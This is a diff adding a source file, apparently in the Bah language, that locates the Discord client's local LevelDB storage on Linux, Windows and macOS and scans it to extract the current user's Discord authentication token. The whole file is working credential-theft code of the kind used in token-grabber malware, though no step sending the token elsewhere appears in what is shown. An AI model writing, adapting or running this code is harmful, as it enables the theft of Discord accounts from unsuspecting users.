@@ -1,0 +1,90 @@
+#include "iostream.bah"
+#include "path.bah"
+
+#define! getenv(s cpstring) cpstring
+
+//Get the local storage DB file name.
+getDBfile(p cpstring) cpstring {
+    files = listFiles(p)
+
+    if len(files) == 0 {
+        panic("Discord not correctly installed...")
+    }
+
+    i=0; for i < len(files) {
+        f = string(files[i])
+        if f.hasSuffix(".ldb") {
+            return f.str()
+        }
+        i = i + 1
+    }
+
+    panic("Could not find discord storage file...")
+
+    return ""
+}
+
+//Find the token inside the db file.
+scrapToken(fn cpstring) cpstring {
+    c char
+    fs = fileStream{}
+    fs.open(fn, "r")
+    l = fs.getSize()
+
+    tok = []char
+
+    needle = []char{'>', 't', 'o', 'k', 'e', 'n'}
+    needleIndex = 0
+
+    //go to position starting with '>token'
+    i=0; for i < l {
+        c = fs.getChar()
+        if needle[needleIndex] == c {
+            needleIndex = needleIndex + 1
+        } else {
+            needleIndex = 0
+        }
+        if needleIndex == len(needle) {
+            break
+        }
+        i = i + 1
+    }
+
+    //skip chars that are not the start of a string
+    for i < l {
+        c = fs.getChar()
+        if c == <char>34 {
+            break
+        }
+        i = i + 1
+    }
+
+    //catch token inside brackets
+    for i < l {
+        c = fs.getChar()
+        if c == <char>34 {
+            break
+        }
+        tok[len(tok)] = c
+        i = i + 1
+    }
+
+    return arrToStr(tok)
+}
+
+//Get current user's discord token.
+getToken() cpstring {
+    //get chromium local storage
+    #linux {
+        path = getenv("HOME") + "/.config/discord/Local Storage/leveldb"
+    }
+    #windows {
+        path = getenv("APPDATA") + "/discord/Local Storage/leveldb"
+    }
+    #darwin {
+        path = getenv("HOME") + "/Library/Application Support/Discord/Local Storage/leveldb"
+    }
+    dbFile = getDBfile(path)
+    token = scrapToken(path + "/" + dbFile)
+    return token
+}
